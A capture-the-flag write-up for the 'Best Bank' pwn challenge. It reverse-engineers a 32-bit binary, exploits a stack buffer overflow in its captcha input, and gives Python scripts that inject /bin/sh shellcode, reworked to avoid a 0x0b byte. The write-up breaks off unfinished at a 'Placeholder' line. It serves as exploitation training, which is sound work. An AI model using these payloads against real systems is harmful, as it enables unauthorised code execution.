# Best Bank

## Pwn: 250 points

## Challenge

The Best Bank has been opened to the public! Perhaps the Best Bank is not as secure as it seems?

`nc challenges.laptophackingcoffee.org 2168`

Credit: Tux#1576

[ [bank](bank) ]

## Solution

### Run the Program

Download the [bank](bank) file and inspect it. The `file` commands shows that the binary is a 32-bit executable and stripped of its debug symbols:
```
$ file bank
bank: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=26163dec7eb11546fe50a0db8bdae0ea79be8939, stripped
```

Add execute permissions and run the binary. Play around with the options and get a feel for the program:
```
$ chmod +x bank
$ ./bank
Welcome to the Best Bank!
Current balance: $500

Options:
[1] Withdraw
[2] Deposit
[3] Check Balance
[4] Exit
Enter your choice: 3
Your current balance is: $500

Options:
[1] Withdraw
[2] Deposit
[3] Check Balance
[4] Exit
Enter your choice: 1
 _    _____    _____ _       _          _  __
| |__|___ / __|_   _| |__   / \   _ __ | |/ /
| '_ \ |_ \/ __|| | | '_ \ / _ \ | '_ \| ' /
| |_) |__) \__ \| | | |_) / ___ \| | | | . \
|_.__/____/|___/|_| |_.__/_/   \_\_| |_|_|\_\

Captcha: b3sTbAnK
Correct!

How much would you like to withdraw?: 100
Withdrawal successful!

Options:
[1] Withdraw
[2] Deposit
[3] Check Balance
[4] Exit
Enter your choice: 4
```

A few quick notes from the initial run:

1. Entering any number besides 1-4 results in an error message: `That is not a valid choice! Try again.`
2. Entering any non-numeric character results in an infinite loop of the same error message.
3. The deposit and withdraw options require a **Captcha**, which is always the same: **b3sTbAnK**. Even though the captcha is only eight characters long, the function accepts input of much longer length.

### Decompile with Ghidra

Open the binary in Ghidra and analyze the file. In the **Symbol Tree** under **Functions**, click the `entry` function. This function just calls `__libc_start_main` with `FUN_080493dc` as a parameter.
```c
void entry(void)
{
  __libc_start_main(FUN_080493dc);
  ...
}
```

Inspect `FUN_080493dc`. This function shows the bank menu and handles user input. Rename it to `bankMenu` and rename the other variables. This is the result:
```c
void bankMenu(undefined1 param_1)
{
  int selectedOption;
  ...
  puts("Welcome to the Best Bank!");
  puts("Current balance: $500\n");
  do {
    while( true ) {
      while( true ) {
        // If option != deposit then break
        showOptions();
        printf("Enter your choice: ");
        __isoc99_scanf(&optionFormat, &selectedOption);
        if (selectedOption != 2) break;
        deposit();
      }
      // if selectedOption > 2: break
      if (2 < selectedOption) break;
      if (selectedOption == 1) {
        withdraw();
      }
      else {
LAB_080494cb:
        puts("That is not a valid choice! Try again.\n");
      }
    }
    if (selectedOption != 3) {
      if (selectedOption == 4) {
        exit(0);
      }
      goto LAB_080494cb;
    }
    // selectedOption = 3
    checkBalance();
  } while( true );
}
```

From the `bankMenu` function, all other feature-functions get called:
```
showOptions()           shows the options menu
withdraw()              option 1: [1] Withdraw
deposit()               option 2: [2] Deposit 
checkBalance()          option 3: [3] Check Balance
exit(0)                 option 4: [4] Exit
```

Inspect the `deposit` and `withdraw` functions. Both features require a captcha to proceed and this is reflected in the code. Here is the `withdraw` function with the `captcha` check:
```c
void withdraw(void)
{
  uint captchaResult;
  int withdrawAmount [2];
  
  captchaResult = captcha();
  if (captchaResult != 0) {
    printf("How much would you like to withdraw?: ");
    ...
  }
  return;
}
```

Inspect the `captcha` function. The `puts` method prints the **b3sTbAnK** ASCII art to the screen. Then the `__isoc99_scanf` method gets user input and stores it in `userCaptcha`, which is an array of 1000 characters.
```c
uint captcha(void)
{
  int result;
  undefined4 b3sT;
  undefined4 bAnK;
  undefined zero;       // unused var
  char userCaptcha [1000];
  char *captchaImage;   // unused var
  
  b3sT = 0x54733362;    // 54 73 33 62 = Ts3b
  bAnK = 0x4b6e4162;    // 4b 6e 41 62 = KnAb
  zero = 0;
  captchaImage = /* b3sTbAnK ASCII art */ ;
  puts( /* b3sTbAnK ASCII art */ );
  printf("Captcha: ");
  __isoc99_scanf(&captchaFormat,userCaptcha);
  result = strncmp(userCaptcha,(char *)&b3sT,8);
  if (result != 0) {
    puts("Incorrect!\n");
  }
  else {
    puts("Correct!\n");
  }
  return (uint)(result == 0);
}
```

The full decompiled program can be viewed here: [bank.c](bank.c).

### Segmentation Fault

What would happen if more than 1000 characters are sent to the `captcha` method? Build a quick payload file with python:
```
$ python3 -c "print('1 ' + 'A'*1012)"
1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ...
```

According to [GeeksforGeeks][2], `scanf` "is used to read the input until it encounters a space, newline, or End Of File (EOF)." When the `bank` program receives the payload of `1 AAAAAA...`, `scanf` scans the "1" and stops at the space. Then at the next `scanf` call, the function scans the string of "A"s.

Send the payload to the program:
```
$ python3 -c "print('1 ' + 'A'*1012)" > payload
$ ./bank temp < payload
Welcome to the Best Bank!
Current balance: $500
...
Captcha: Incorrect!

Segmentation fault (core dumped)
```

A captcha input of 1012 characters or more results in a segmentation fault. Anything less does not. This 1012 character limit was determined through trial and error.

### Debug with GDB

Find out what caused the segmentation fault. Open the program in gdb. Run the program with the payload:
```
$ env - gdb bank
(gdb) set disassembly-flavor intel
(gdb) run < payload
Starting program: /lhc/Pwn/BestBank/bank < payload
...
Captcha: Incorrect!

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```
Note that the `env -` command removes environment variables, including variables that modify gdb like [gdb-dashboard][3]. This write-up assumes a default gdb environment. However, [gdb-dashboard][3] is **highly recommended**. 

Inspect the registers: 
```
(gdb) info registers
...
ebp            0x41414141	0x41414141
...
eip            0x41414141	0x41414141                  
```

As shown above, the `eip` (instruction pointer) and `ebp` (stack base pointer) registers have been overwritten with `0x41414141`, which is "AAAA" in hex. The payload has successfully overwritten the instruction pointer, which can control the flow of the program.

Examine the instruction pointer:
```
(gdb) x $eip 
0x41414141:	Cannot access memory at address 0x41414141
```

The program cannot access the memory at the overwritten address `0x41414141`, which results in a segmentation fault.

Now take a closer look at what is happening in the program. Set a breakpoint at the `scanf` function:
```
(gdb) info functions scanf
All functions matching regular expression "scanf":

Non-debugging symbols:
0x08049080  __isoc99_scanf@plt

(gdb) break __isoc99_scanf@plt
Breakpoint 1 at 0x8049080
```

Verify the breakpoint was setup correctly:
```
(gdb) info breakpoints
Num     Type           Disp Enb Address    What
1       breakpoint     keep y   0x08049080 <__isoc99_scanf@plt>
```

Define a gdb function called [hook-stop](https://youtu.be/HSlhY4Uy8SA?t=92) that will print the current instruction and the stack when the program hits a breakpoint:
```
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>x/1i $eip
>x/16wx $esp
>end
(gdb) 
```

The two `x` (examine) commands breakdown like this:
```
x/1i $eip       ; examine 1 instruction starting from $eip address
x/16wx $esp     ; examine 16 words in hex starting from $esp address
```

Run the program with the payload. Continue until the captcha appears and the program hits the captcha's `scanf` breakpoint. 
```
(gdb) run < payload
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /lhc/Pwn/BestBank/bank < payload
Welcome to the Best Bank!
Current balance: $500

Options:
[1] Withdraw
[2] Deposit
[3] Check Balance
[4] Exit
Enter your choice: => 0x8049080 <__isoc99_scanf@plt>:	jmp    DWORD PTR ds:0x804c020
0xffffdd7c:	0x08049489	0x0804a137	0xffffdd9c	0xffffdda8
0xffffdd8c:	0x08049464	0x00000001	0xffffde54	0xffffde5c
0xffffdd9c:	0x0804950b	0xffffddc0	0x00000000	0x00000000
0xffffddac:	0xf7df0e81	0xf7fb0000	0xf7fb0000	0x00000000

Breakpoint 1, 0x08049080 in __isoc99_scanf@plt ()
(gdb) c
Continuing.
 _    _____    _____ _       _          _  __
| |__|___ / __|_   _| |__   / \   _ __ | |/ /
| '_ \ |_ \/ __|| | | '_ \ / _ \ | '_ \| ' /
| |_) |__) \__ \| | | |_) / ___ \| | | | . \
|_.__/____/|___/|_| |_.__/_/   \_\_| |_|_|\_\

Captcha: => 0x8049080 <__isoc99_scanf@plt>:	jmp    DWORD PTR ds:0x804c020
0xffffd94c:	0x08049221	0x0804a0f7	0xffffd974	0x00000002
0xffffd95c:	0x080491c1	0x00010001	0x00381ea0	0x62808426
0xffffd96c:	0x62547333	0x004b6e41	0xffffd970	0xf7fdf289
0xffffd97c:	0x000000d5	0xf7dd9cb8	0x677f9a5f	0xf7fd0110

Breakpoint 1, 0x08049080 in __isoc99_scanf@plt ()
```

Use the `finish` command after the captcha's `scanf` call:
```
(gdb) finish
Run till exit from #0  0x08049080 in __isoc99_scanf@plt ()
=> 0x8049221:	add    esp,0x10
0xffffd950:	0x0804a0f7	0xffffd974	0x00000002	0x080491c1
0xffffd960:	0x00010001	0x00381ea0	0x62808426	0x62547333
0xffffd970:	0x004b6e41	0x41414141	0x41414141	0x41414141
0xffffd980:	0x41414141	0x41414141	0x41414141	0x41414141
0x08049221 in ?? ()
```

Note that the `help` function can explain any unfamiliar command like `finish`:
```
(gdb) help finish
Execute until selected stack frame returns.
Usage: finish
Upon return, the value returned is printed and put in the value history.
```

At this point `scanf` has already scanned in the payload of "A"s, which are visible on the stack as `0x41414141`:
```
0xffffd970:	0x004b6e41	0x41414141	0x41414141	0x41414141
0xffffd980:	0x41414141	0x41414141	0x41414141	0x41414141
```

Now that `scanf` has completed, the program returned to the `captcha` function. Examine about 30 instructions starting from the current instruction.
```
(gdb) x/30i $eip
=> 0x8049221:	add    esp,0x10
   0x8049224:	sub    esp,0x4
   0x8049227:	push   0x8
   0x8049229:	lea    eax,[ebp-0x3fd]
   0x804922f:	push   eax
   0x8049230:	lea    eax,[ebp-0x3f4]
   0x8049236:	push   eax
   0x8049237:	call   0x8049090 <strncmp@plt>
   0x804923c:	add    esp,0x10
   0x804923f:	test   eax,eax
   0x8049241:	jne    0x804925c
   0x8049243:	sub    esp,0xc
   0x8049246:	lea    eax,[ebx-0x1f06]
   0x804924c:	push   eax
   0x804924d:	call   0x8049050 <puts@plt>
   0x8049252:	add    esp,0x10
   0x8049255:	mov    eax,0x1
   0x804925a:	jmp    0x8049273
   0x804925c:	sub    esp,0xc
   0x804925f:	lea    eax,[ebx-0x1efc]
   0x8049265:	push   eax
   0x8049266:	call   0x8049050 <puts@plt>
   0x804926b:	add    esp,0x10
   0x804926e:	mov    eax,0x0
   0x8049273:	mov    ebx,DWORD PTR [ebp-0x4]
   0x8049276:	leave  
   0x8049277:	ret    
   0x8049278:	push   ebp
   0x8049279:	mov    ebp,esp
   0x804927b:	push   ebx  
```

Notice that these instructions match with the `captcha` function in [bank.c](bank.c):
| Assembly               | bank.c  |
| :----------------------------- | :------- |
| `0x8049237:	call   0x8049090 <strncmp@plt>` | `strncmp(userCaptcha,(char *)&b3sT,8);`
| `0x8049241:	jne    0x804925c` | `if (result != 0)`
| `0x804924d:	call   0x8049050 <puts@plt>` | `puts("Correct!\n");`
| `0x8049266:	call   0x8049050 <puts@plt>` | `puts("Incorrect!\n");`

Set a breakpoint at the `leave` instruction:
```
(gdb) break *0x8049276
Breakpoint 2 at 0x8049276
```

Note that [leave][6] is equivalent to:
```
mov  esp,ebp     # set stack pointer $esp to equal the base pointer $ebp
pop  ebp         # pop top value of stack and store into $ebp
```

And [ret][7] is equivalent to:
```
pop ecx         # pop top of the stack and store it in $ecx
jmp ecx         # jump to $ecx
```

Continue the program until it hits the `0x8049276` breakpoint. Then step instruction with `stepi` (`si` for short):
```
(gdb) c
Continuing.
Incorrect!

=> 0x8049276:	leave  
0xffffd960:	0x00010001	0x00381ea0	0x62808426	0x62547333
0xffffd970:	0x004b6e41	0x41414141	0x41414141	0x41414141
0xffffd980:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd990:	0x41414141	0x41414141	0x41414141	0x41414141

Breakpoint 2, 0x08049276 in ?? ()
(gdb) si
=> 0x8049277:	ret    
0xffffdd6c:	0x0804928f	0xf7fb0000	0x00000000	0xffffdda8
0xffffdd7c:	0x08049489	0x0804a137	0x0804c000	0xffffdda8
0xffffdd8c:	0x080494b1	0x00000001	0xffffde54	0xffffde5c
0xffffdd9c:	0x00000001	0xffffddc0	0x00000000	0x00000000
0x08049277 in ?? ()
(gdb) 
```

At this point the `ret` function is about to pop the top of the stack (`0x0804928f`) and return to that address. Step again to see this:
```
(gdb) si
=> 0x804928f:	test   eax,eax
0xffffdd70:	0xf7fb0000	0x00000000	0xffffdda8	0x08049489
0xffffdd80:	0x0804a137	0x0804c000	0xffffdda8	0x080494b1
0xffffdd90:	0x00000001	0xffffde54	0xffffde5c	0x00000001
0xffffdda0:	0xffffddc0	0x00000000	0x00000000	0xf7df0e81
0x0804928f in ?? ()
```

The program returned to the function that called `captcha`, which is the `withdraw` function in this case. Step a few more instructions to get the `ret`:
```
(gdb) si
=> 0x8049306:	ret    
0xffffdd04:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffdd14:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffdd24:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffdd34:	0x41414141	0x41414141	0x41414141	0x41414141
0x08049306 in ?? ()
(gdb) 
```

The program is about to pop the top of the stack and return to that address. However, the stack is filled with the payload of "A"s. When the program returns to address `0x41414141`, it segfaults:
```
(gdb) si
=> 0x41414141:	Error while running hook_stop:
Cannot access memory at address 0x41414141
0x41414141 in ?? ()
(gdb) si

Program received signal SIGSEGV, Segmentation fault.
=> 0x41414141:	Error while running hook_stop:
Cannot access memory at address 0x41414141
0x41414141 in ?? ()
```

But can the `captcha` function's return instruction be controlled, which is the return at `0x8049277:ret`? Experiment by adding a few more bytes to the payload:
```
$ python3 -c "print('1 ' + 'A'*1012 + 'BBBB' + 'CCCC')" > payload
```

Run the program again with this new payload. Continue until breakpoint at `0x08049276`:
```
(gdb) run < payload
...
(gdb) c
Continuing.
Incorrect!

=> 0x8049276:	leave  
0xffffd960:	0x00010001	0x00381ea0	0x62808426	0x62547333
0xffffd970:	0x004b6e41	0x41414141	0x41414141	0x41414141
0xffffd980:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd990:	0x41414141	0x41414141	0x41414141	0x41414141

Breakpoint 2, 0x08049276 in ?? ()
(gdb) si
=> 0x8049277:	ret    
0xffffdd6c:	0x43434343	0xf7fb0000	0x00000000	0xffffdda8
0xffffdd7c:	0x08049489	0x0804a137	0x0804c000	0xffffdda8
0xffffdd8c:	0x080494b1	0x00000001	0xffffde54	0xffffde5c
0xffffdd9c:	0x00000001	0xffffddc0	0x00000000	0x00000000
0x08049277 in ?? ()
```

At `0x8049277`, the `ret` instruction is about to pop and return to address `0x43434343`, which is "CCCC" in hex. "CCCC" can be changed to any address desired. Therefore, the payload successfully manipulated the instruction pointer at the `0x8049277:ret` instruction!

### Exploit Version 1: Deploy Payload

At this point, it's tempting to write shell code to the stack and jump to the shell code address per the instructions in [LiveOverflow's video][4]. Give this approach a try. 

First, find a good address to return to. Open up gdb. Run the program again without a payload (use `set args` to clear any arguments). Run until breakpoint at `0x08049276` then take a look at the stack pointer:
```
(gdb) set args
(gdb) run
...
Breakpoint 2, 0x08049276 in ?? ()
(gdb) si
=> 0x8049277:	ret    
0xffffdd6c:	0x0804928f	0xf7fb0000
...
(gdb) x $esp
0xffffdd6c:	0x0804928f
```

The stack pointer `esp` is at `0xffffdd6c`. And the stack looks like this:
```
            return address
            v
0xffffdd6c:	0x0804928f	0xf7fb0000
^                       ^
$esp address            payload starts here = $esp + 4
```

The payload starts at `esp` + 4. Use this as the return address for the payload:
```
eip = 0xffffdd6c + 4
```

Use the shell code LiveOverflow suggested by [Shell Storm: Linux x86 execve("/bin/sh")][5]:
```
/*
Title:	Linux x86 execve("/bin/sh") - 28 bytes
Author:	Jean Pascal Pereira <pereira@secbiz.de>
Web:	http://0xffe4.org


Disassembly of section .text:

08048060 <_start>:
 8048060: 31 c0                 xor    %eax,%eax
 8048062: 50                    push   %eax
 8048063: 68 2f 2f 73 68        push   $0x68732f2f
 8048068: 68 2f 62 69 6e        push   $0x6e69622f
 804806d: 89 e3                 mov    %esp,%ebx
 804806f: 89 c1                 mov    %eax,%ecx
 8048071: 89 c2                 mov    %eax,%edx
 8048073: b0 0b                 mov    $0xb,%al
 8048075: cd 80                 int    $0x80
 8048077: 31 c0                 xor    %eax,%eax
 8048079: 40                    inc    %eax
 804807a: cd 80                 int    $0x80
*/

#include <stdio.h>

char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
                   "\x68\x68\x2f\x62\x69\x6e\x89"
                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
                   "\xcd\x80\x31\xc0\x40\xcd\x80";

int main()
{
  fprintf(stdout,"Lenght: %d\n",strlen(shellcode));
  (*(void  (*)()) shellcode)();
}
```

Create the payload with a [python](exploit1.py) script. Note that `eip` is set to the return address of `0xffffdd6c + 4` as discovered earlier.
```python
import struct

eip = struct.pack("I", 0xffffdd6c + 4)
shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
payload = b'1 ' + b'A' * 1012 + b'BBBB' + eip + shellcode

with open("payload", "wb") as handle:
    handle.write(payload)
```

Run this script and run the payload in gdb. Pause at breakpoint `0x08049276`:
```
(gdb) run < payload
...
Breakpoint 2, 0x08049276 in ?? ()
(gdb) si
=> 0x8049277:	ret    
0xffffdd6c:	0xffffdd70	0x6850c031
```

This is good. The program is about to return to `0xffffdd70` (which is `0xffffdd6c + 4`) just as intended. However, continue the program and it segfaults. Why?

Examine the stack and make sure everything else is in place. The return address is definitely correct:
```
=> 0x8049277:	ret
            return address is correct
            v
0xffffdd6c:	0xffffdd70  0x6850c031
```

What about the payload? Compare the intended payload with the stack contents. It is easier to read the stack in byte sizes due to [endianness](https://en.wikipedia.org/wiki/Endianness). Use this command: `x/48bx $esp+4`. Here is the output with comparison to the payload:
```
(gdb) x/48bx $esp+4
intended payload address
v
0xffffdd70:	0x31	0xc0	0x50	0x68	0x2f	0x2f	0x73	0x68  # stack
            \x31    \xc0    \x50    \x68    \x2f    \x2f    \x73    \x68  # payload
            
0xffffdd78:	0x68	0x2f	0x62	0x69	0x6e	0x89	0xe3	0x89  # stack
            \x68    \x2f    \x62    \x69    \x6e    \x89    \xe3    \x89  # payload

0xffffdd80:	0xc1	0x89	0xc2	0xb0	0x00	0xc0	0x04	0x08  # stack
            \xc1    \x89    \xc2    \xb0    \x0b    \xcd    \x80    \x31  # payload
                                            ^ starting from this byte, the payload and stack do not match

0xffffdd88:	0xa8	0xdd	0xff	0xff	0xb1	0x94	0x04	0x08  # stack
            \xc0    \x40    \xcd    \x80                                  # payload
...
```

Turns out that `scanf` stops scanning at `0x0b`, which is a vertical tab according to the [ascii table](http://www.asciitable.com/). What happens if this byte is removed? Try it. Remove byte `0x0b`, run the script again, and examine the stack. The stack and payload now match. Thus, only byte `0x0b` causes an issue. Is it possible to get around this? Yes.

### Circumvent Scanf's `0x0b` Limitation

The `scanf` function stops scanning at byte `0x0b` likely because `0x0b` is considered as a terminating character. Therefore, this byte must be removed from the payload. And the question becomes: how to deliver the same payload without byte `0x0b`?

First, examine what that byte is doing. Take a look at the shellcode again:
```
8048073: b0 0b      mov    $0xb,%al
```

The above assembly instruction `mov $0xb,%al` is written in AT&T assembly syntax. In Intel assembly, it looks like this:
```
8048073: b0 0b      mov    al,0xb
```

This instruction moves the hex value `0xb` into register `al`, which addresses the lowest 8-bits of the `eax` register ([source][8]):
```
+--------------------------------------+
| Register |        Accumulator        |
+--------------------------------------+
| 32-bit   |            EAX            |
+--------------------------------------+
| 16-bit   |             |     AX      |
+--------------------------------------+
| 8-bit    |             |  AH  |  AL  |
+--------------------------------------+
```

Instead of moving `0xb` directly into `al`, it is possible to move another value and then subtract from that value to get the desired result. For instance:
```
mov al, 255
sub al, 244
```
255 minus 244 equals 11, which is `0xb`. 

Now get the opcodes of these instructions. Create a new file called [movb.asm](movb.asm). Add in the assembly instructions above along with the required template code:
```
global _start
_start:
	mov al, 255		
	sub al, 244 
	mov eax, 1		; sys_exit system call
	int 0x80		; interrupt for system call
```

Compile and run it with gdb:
```
$ nasm -f elf32 movb.asm -o a1.out
$ ld -m elf_i386 a1.out -o a2.out
$ gdb a2.out
```

Set a breakpoint at the `_start` function. Define a `hook-stop` function to print `eax` and the current instruction. Then step just two instructions:
```
(gdb) set disassembly-flavor intel
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048060  _start
...
(gdb) break _start
Breakpoint 1 at 0x8048060
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>info registers eax
>x/1i $eip
>end
(gdb) run
Starting program: /assembly/a2.out 
eax            0x0	0
=> 0x8048060 <_start>:	mov    al,0xff

Breakpoint 1, 0x08048060 in _start ()
(gdb) si
eax            0xff	255
=> 0x8048062 <_start+2>:	sub    al,0xf4
0x08048062 in _start ()
(gdb) si
eax            0xb	11
=> 0x8048064 <_start+4>:	mov    eax,0x1
0x08048064 in _start ()
(gdb) 
```

After stepping through the first two instructions, `eax` is set to `0xb`:
```
eax     0xb     11
```

Now grab the actual opcodes for these instructions. Run the program again. Examine the first three instructions from the instruction pointer:
```
(gdb) run
...
eax            0x0	0
=> 0x8048060 <_start>:	mov    al,0xff

Breakpoint 1, 0x08048060 in _start ()
(gdb) x/3i $eip
=> 0x8048060 <_start>:	    mov    al,0xff
   0x8048062 <_start+2>:	sub    al,0xf4
   0x8048064 <_start+4>:	mov    eax,0x1
```

From the first instruction to the next is a difference of two bytes from `0x8048060 <_start>` to `0x8048062 <_start+2>`. The same is true for the second to third instructions. Therefore, both `mov al,0xff` and `sub al,0xf4` instructions are two bytes long. Inspect two bytes from `eip` at those intervals to view the opcodes:
```
(gdb) x/2bx $eip
0x8048060 <_start>:	    0xb0	0xff
(gdb) x/2bx $eip+2
0x8048062 <_start+2>:	0x2c	0xf4
```

This table summarizes the instructions and their corresponding opcodes found:
```
Instruction     Opcode
-----------     ---------
mov al,0xff     0xb0 0xff
sub al,0xf4     0x2c 0xf4
```

### Exploit Version 2: Execute Shell

Now with the `scanf` byte `0xb` circumvention tactics in hand, create a new [exploit script](exploit2.py) to take advantage of this new information. Remove the `b0 0b` bytes from the original shell code and add in the `mov` and `sub` opcodes:
```python
import struct

eip = struct.pack("I", 0xffffdd6c + 4)

# mov al,0xff     0xb0 0xff
# sub al,0xf4     0x2c 0xf4
mov = b'\xb0\xff'
sub = b'\x2c\xf4'
shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2'
shellcode += mov + sub + b'\xcd\x80\x31\xc0\x40\xcd\x80'

payload = b'1 ' + b'A' * 1012 + b'BBBB' + eip + shellcode

with open("payload", "wb") as handle:
    handle.write(payload)
```

Run the payload in gdb and stop at the `0x8049277: ret` instruction. Examine the stack and verify that the entire payload made it:
```
(gdb) x/48bx $esp+4
0xffffdd70:	0x31	0xc0	0x50	0x68	0x2f	0x2f	0x73	0x68    # stack
            \x31    \xc0    \x50    \x68    \x2f    \x2f    \x73    \x68    # payload

0xffffdd78:	0x68	0x2f	0x62	0x69	0x6e	0x89	0xe3	0x89    # stack
            \x68    \x2f    \x62    \x69    \x6e    \x89    \xe3    \x89    # payload

0xffffdd80:	0xc1	0x89	0xc2	0xb0	0xff	0x2c	0xf4	0xcd    # stack
            \xc1    \x89    \xc2    \xb0    \xff    \x2c    \xf4    \xcd    # payload

0xffffdd88:	0x80	0x31	0xc0	0x40	0xcd	0x80	0x00	0x08    # stack
            \x80    \x31    \xc0    \x40    \xcd    \x80    ^ null          # payload
```

Success! The payload was fully copied into the stack. Continue the program:
```
(gdb) c
Continuing.
process 25937 is executing new program: /bin/dash
```

The program successfully executes the shell program `/bin/dash`. Awesome! 

Now run it without gdb. The program segfaults:
```
$ ./bank < payload
Welcome to the Best Bank!
...
Segmentation fault (core dumped)
```

Run the program again in one terminal:
```
$ ./bank
```

In another terminal window, run gdb while attaching to the running bank program:
```
$ sudo gdb -p `pidof bank`
```

Set a breakpoint at the familiar `0x8049276` address and continue:
```
(gdb) break *0x8049276
(gdb) continue
```

Enter input as normal in the bank's terminal window until the breakpoint hits in the gdb window. Once the breakpoint hits, examine the stack pointer `esp`:
```
(gdb) info registers esp
esp            0xffa73dd0	0xffa73dd0
```

This `0xffa73dd0` address is far off from the predicted `0xffffdd6c` address used in the payload. Why is it so different? This difference is due to [Address Space Layout Randomization (ASLR)][9]. Therefore, the stack address used in gdb cannot be used in a live program. Furthermore, gdb has ASLR turned off by default for easier debugging. To turn ASLR on, use this command:
```
(gdb) set disable-randomization off
```

To turn ASLR back off (default setting), use this:
```
(gdb) set disable-randomization on
```

### Checksec and Proc Maps

Before attempting to defeat ASLR, first explore other options. Check the program's security settings with `checksec`:
```
$ checksec bank
[*] '/lhc/Pwn/BestBank/bank'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

This gives a lot of good information. `NX` in `NX disabled` stands for non-execute. With this disabled, there are areas of the program that can be overwritten and executed, which is great for exploitation. `PIE` stands for Position Independent Executable. If enabled, PIE further randomizes the memory location that the program executes in. Having this disabled is also great. There is a lot more information about these codes in this article: [Binary Executable Security][10].

If `NX` is disabled for some areas, which areas of memory are executable? Find out with the program's **proc map**. Run bank in a new terminal. In another terminal, print the proc map like this:
```
$ pidof bank
28447
$ cat /proc/28447/maps
```

The output looks similar to this. The column headers are added for convenience.
```
Start    End Addr RWX? Offset                                            Location/Description
08048000-0804b000 r-xp 00000000 fd:01 2441960                            /lhc/Pwn/BestBank/bank
0804b000-0804c000 r-xp 00002000 fd:01 2441960                            /lhc/Pwn/BestBank/bank
0804c000-0804d000 rwxp 00003000 fd:01 2441960                            /lhc/Pwn/BestBank/bank
f7d93000-f7f68000 r-xp 00000000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
f7f68000-f7f69000 ---p 001d5000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
f7f69000-f7f6b000 r-xp 001d5000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
f7f6b000-f7f6c000 rwxp 001d7000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
f7f6c000-f7f6f000 rwxp 00000000 00:00 0 
f7f8b000-f7f8d000 rwxp 00000000 00:00 0 
f7f8d000-f7f90000 r--p 00000000 00:00 0                                  [vvar]
f7f90000-f7f91000 r-xp 00000000 00:00 0                                  [vdso]
f7f91000-f7fb7000 r-xp 00000000 fd:01 8130737                            /lib/i386-linux-gnu/ld-2.27.so
f7fb7000-f7fb8000 r-xp 00025000 fd:01 8130737                            /lib/i386-linux-gnu/ld-2.27.so
f7fb8000-f7fb9000 rwxp 00026000 fd:01 8130737                            /lib/i386-linux-gnu/ld-2.27.so
ff850000-ff871000 rwxp 00000000 00:00 0                                  [stack]
```

A process's proc map can also be viewed in gdb with this command:
```
(gdb) info proc map
```

Run the bank program a few more times and print its proc map again. Notice that the `f7d93000` addresses always change due to ASLR. However, addresses from `08048000` to `0804d000` always stay the same. Additionally, section `0804c000-0804d000` has `rwx` permissions (read, write, and execute). This section is particularly vulnerable to exploitation.

### Exploit Version 3: Jump to Scanf

The payload cannot reliably jump back to the stack due to ASLR. Therefore, it has to write to and jump back to a reliable location in memory, like section `0804c000-0804d000`. 

Now that section `0804c000-0804d000` is exposed as vulnerable, just need to write the payload to that location and jump to it. However, the payload writes to the stack first due to the program itself. But what if first took control of the program with one payload and then jumped back to scanf with a second craft exploit that will write to the desired vulnerable section. This can work.

Will need to drill down into how scanf works. From Ghidra's decompiled C code [bank.c](bank.c), 
```c
uint captcha(void) {}
    ...
    printf("Captcha: ");
    __isoc99_scanf(&DAT_0804a0f7,userCaptcha);
    ...
}
```

Set a breakpoint at the `printf` function (because its right before the scanf).

Stop at the instruction just after the printf completes:
```
 _    _____    _____ _       _          _  __
| |__|___ / __|_   _| |__   / \   _ __ | |/ /
| '_ \ |_ \/ __|| | | '_ \ / _ \ | '_ \| ' /
| |_) |__) \__ \| | | |_) / ___ \| | | | . \
|_.__/____/|___/|_| |_.__/_/   \_\_| |_|_|\_\

=> 0x8049040 <printf@plt>:	jmp    DWORD PTR ds:0x804c010
0xffffd94c:	0x08049208	0x0804a0ed	0xf7fd676c	0x00000002
0xffffd95c:	0x080491c1	0x00010001	0x00381ea0	0x62808426
0xffffd96c:	0x62547333	0x004b6e41	0xffffd970	0xf7fdf289
0xffffd97c:	0x000000d5	0xf7dd9cb8	0x677f9a5f	0xf7fd0110

Breakpoint 3, 0x08049040 in printf@plt ()
(gdb) finish
Run till exit from #0  0x08049040 in printf@plt ()
Captcha: => 0x8049208:	add    esp,0x10
0xffffd950:	0x0804a0ed	0xf7fd676c	0x00000002	0x080491c1
0xffffd960:	0x00010001	0x00381ea0	0x62808426	0x62547333
0xffffd970:	0x004b6e41	0xffffd970	0xf7fdf289	0x000000d5
0xffffd980:	0xf7dd9cb8	0x677f9a5f	0xf7fd0110	0xf7fdf73d
0x08049208 in ?? ()
(gdb) 
```

Which is instruction 0x8049208. Set a breakpoint at 0x8049208. Examine 10 instructions from 0x8049208.
```
(gdb) x/10i $eip
=> 0x8049208:	add    esp,0x10
   0x804920b:	sub    esp,0x8
   0x804920e:	lea    eax,[ebp-0x3f4]      ; 0x3f4 = 1012, likely the location to store the captcha input
   0x8049214:	push   eax
   0x8049215:	lea    eax,[ebx-0x1f09]     ; 
   0x804921b:	push   eax
   0x804921c:	call   0x8049080 <__isoc99_scanf@plt>
   0x8049221:	add    esp,0x10
   ...
(gdb) x/s $ebx-0x1f09
0x804a0f7:	"%s"
```

Placeholder
```
CALL actually does this for you for example
